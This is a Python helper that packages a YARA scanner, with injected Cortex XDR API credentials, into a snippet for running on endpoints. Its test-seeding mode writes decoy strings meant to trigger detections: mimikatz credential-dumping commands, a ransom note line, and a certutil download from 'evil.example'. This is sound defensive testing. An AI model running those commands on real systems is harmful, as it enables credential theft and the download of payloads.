#!/usr/bin/env python3
"""Wrap xdr_yara_scanner.py into a self-contained snippet runnable via
run_snippet_code_script on a Cortex XDR endpoint (no library upload needed).

What it does:
  * injects real XDR creds (from .env) into the DEFAULT_XDR_* placeholders
  * neutralizes the scanner's __main__ guard (a snippet runs as __main__)
  * appends a footer that calls main(...) with the chosen params and prints the summary

The agent snippet sandbox enforces an import allowlist (no `secrets`/`tempfile`), so the
footer sticks to os/shutil/traceback and the scanner uses os.urandom (not secrets).

The produced snippet embeds real credentials — treat it as a secret; write only to a
gitignored location (e.g. local_test/).
"""
import argparse
import base64
import os
import sys


def load_env(path):
    env = {}
    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#") and "=" in line:
                k, v = line.split("=", 1)
                env[k.strip()] = v.strip().strip('"').strip("'")
    return env


def base_url(raw):
    raw = (raw or "").strip().rstrip("/")
    if "/public_api" in raw:
        raw = raw[: raw.index("/public_api")]
    return raw


def build(scanner_path, env, rules_b64, scan_folder, severity, mode, options, seed_files):
    src = open(scanner_path, "r", encoding="utf-8").read()

    src = src.replace('DEFAULT_XDR_API_KEY = "replace_with_xdr_standard_api_key"',
                      f'DEFAULT_XDR_API_KEY = {env["XDR_API_KEY"]!r}')
    src = src.replace('DEFAULT_XDR_API_ID = "replace_with_xdr_standard_api_id"',
                      f'DEFAULT_XDR_API_ID = {env["XDR_API_ID"]!r}')
    src = src.replace('DEFAULT_XDR_API_URL = "replace_with_xdr_standard_api_url"',
                      f'DEFAULT_XDR_API_URL = {base_url(env["XDR_API_URL"])!r}')
    if 'DEFAULT_XDR_API_KEY = ' + repr(env["XDR_API_KEY"]) not in src:
        raise SystemExit("creds not injected — placeholder lines not found in scanner")

    if 'if __name__ == "__main__":' not in src:
        raise SystemExit("__main__ guard not found in scanner")
    src = src.replace('if __name__ == "__main__":', 'if False:  # snippet-neutralized __main__')

    opts_literal = repr(options) if options else "None"
    if mode == "cancel":
        footer = (
            "\n\n# ===== snippet footer: cancel =====\n"
            "import traceback as _tb\n"
            "try:\n"
            f"    print('SCAN_RESULT: ' + str(main(None, None, 'low', mode='cancel', options={opts_literal})))\n"
            "except Exception:\n"
            "    print('SNIPPET_ERROR:\\n' + _tb.format_exc())\n"
        )
    else:
        prelude = ""
        target_expr = repr(scan_folder) if scan_folder else "None"
        if seed_files is not None:
            # Seed a folder with guaranteed-match content (and optional bulk decoys to
            # make the scan long enough to exercise cancellation).
            prelude = (
                "import os as _os, shutil as _sh\n"
                "def _seed():\n"
                "    _base = _os.environ.get('TEMP') or _os.environ.get('TMP') or _os.environ.get('TMPDIR') or '/tmp'\n"
                "    d = _os.path.join(_base, 'yara_scan_test')\n"
                "    _os.makedirs(d, exist_ok=True)\n"
                "    _win = _os.environ.get('WINDIR', 'C:\\\\Windows')\n"
                "    for _exe in ('notepad.exe','calc.exe'):\n"
                "        try: _sh.copy(_os.path.join(_win,'System32',_exe), d)\n"
                "        except Exception: pass\n"
                "    try:\n"
                "        with open(_os.path.join(d,'decoy.txt'),'w') as _f:\n"
                "            _f.write('sekurlsa::logonpasswords gentilkiwi mimikatz kerberos::list\\n')\n"
                "            _f.write('YOUR FILES HAVE BEEN ENCRYPTED - send bitcoin to nowhere\\n')\n"
                "            _f.write('certutil -urlcache -split -f http://evil.example/x\\n')\n"
                "    except Exception: pass\n"
                f"    for _i in range({int(seed_files)}):\n"
                "        try:\n"
                "            with open(_os.path.join(d,'bulk_%05d.txt' % _i),'w') as _f:\n"
                "                _f.write('benign filler %d\\n' % _i)\n"
                "        except Exception: pass\n"
                "    return d\n"
                "_TARGET = _seed()\n"
                "print('SNIPPET target folder: ' + _TARGET)\n"
            )
            target_expr = "_TARGET"
        footer = (
            "\n\n# ===== snippet footer: scan =====\n"
            "import traceback as _tb\n"
            f"_RULES_B64 = '{rules_b64}'\n"
            f"{prelude}"
            "try:\n"
            f"    print('SCAN_RESULT: ' + str(main(_RULES_B64, {target_expr}, {severity!r}, mode={mode!r}, options={opts_literal})))\n"
            "except Exception:\n"
            "    print('SNIPPET_ERROR:\\n' + _tb.format_exc())\n"
        )
    return src + footer


def main():
    here = os.path.dirname(os.path.abspath(__file__))
    repo_default = os.path.abspath(os.path.join(here, "..", "..", "..", ".."))
    ap = argparse.ArgumentParser()
    ap.add_argument("--scanner", default=os.path.join(repo_default, "xdr_yara_scanner.py"))
    ap.add_argument("--env", default=None)
    ap.add_argument("--rules", default=os.path.join(repo_default, "test_rules.yar"))
    ap.add_argument("--scan-folder", default="default")
    ap.add_argument("--severity", default="low")
    ap.add_argument("--mode", default="scan", choices=["scan", "cancel"])
    ap.add_argument("--options", default=None, help="key=value,key=value")
    ap.add_argument("--seed-files", type=int, default=None,
                    help="seed a temp folder with N benign files + guaranteed-match content, scan it")
    ap.add_argument("--out", required=True)
    args = ap.parse_args()

    env_path = args.env
    if not env_path:
        from xdr_lib import find_env_file
        env_path = find_env_file()
    if not env_path:
        sys.exit("no .env found; pass --env")
    env = load_env(env_path)

    rules_b64 = ""
    if args.mode == "scan":
        rules_b64 = base64.b64encode(open(args.rules, "rb").read()).decode("ascii")

    snippet = build(args.scanner, env, rules_b64, args.scan_folder, args.severity,
                    args.mode, args.options, args.seed_files)
    with open(args.out, "w", encoding="utf-8") as f:
        f.write(snippet)
    print(f"wrote {args.out} ({len(snippet)} bytes, mode={args.mode})")


if __name__ == "__main__":
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    main()
